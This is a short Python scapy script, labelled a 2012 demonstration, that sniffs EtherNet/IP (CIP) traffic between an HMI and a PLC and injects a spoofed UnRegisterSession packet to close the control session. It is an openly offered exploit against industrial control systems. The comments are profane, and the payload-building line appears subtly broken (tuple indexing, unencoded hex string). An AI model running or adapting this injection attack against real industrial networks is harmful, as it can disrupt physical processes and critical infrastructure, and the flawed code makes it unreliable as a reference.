#!/usr/bin/env python

############################################################################                                                                              
# close session handle in CIP traffic         
# By Wei Gao                                                                  
#                                                                             
#release date: Aug 27 2012                                                    
# This script is a demonstration of a closing session handle in CIP traffic    
###########################################################################

from sys import argv
from os import geteuid
from scapy.all import *
import socket
import random


#check the program argument
if len(argv) !=4:
   print "[!] Usage: ./exploit.py <interface> <HMI> <Master>"
   sys.exit(0)


payload = ''
tmp = ''

# Sniff a packet to from HMI host to Master
# port 44818 is for EhterNet/IP 
pkt = sniff(filter= "tcp and dst port 44818", count=1)

if pkt:
  print ">>>FUCK, Got a packet."

#make sure it is the fucking one we want
while(pkt[0].flags != "PA"):
  pkt = sniff(filter = "tcp and dst port 44818", count=1)

if pkt:
   print ">>> OK, got the fucking pakcet."

#craft payload to be fucking UnRegisterSession Command
tmp = pkt[0].payload

#format is command + length + session handle + status + sender content + options
#unregistersession command is 66
#length is 0000
#session handle is the same from captures EIP packet
#status must be 00000000
#sender content 0000000000000000
#option must be 00000000
payload = '6600' + '0000' + tmp[4, 7] + '00000000' + '0000000000000000' + '00000000'

#add 54 to the sequence number and send it with close session handle
pkt = sr1(IP(src=pkt[0].src, dst = pkt[0].dst)/TCP(sport= pkt[0].sport, dport = pkt[0].dport, flags="PA", seq=pkt[0].seq + 54, ack=pkt[0].ack, window=pkt[0].window)/payload)

if pkt:
  print ">>> Close CIP session!"



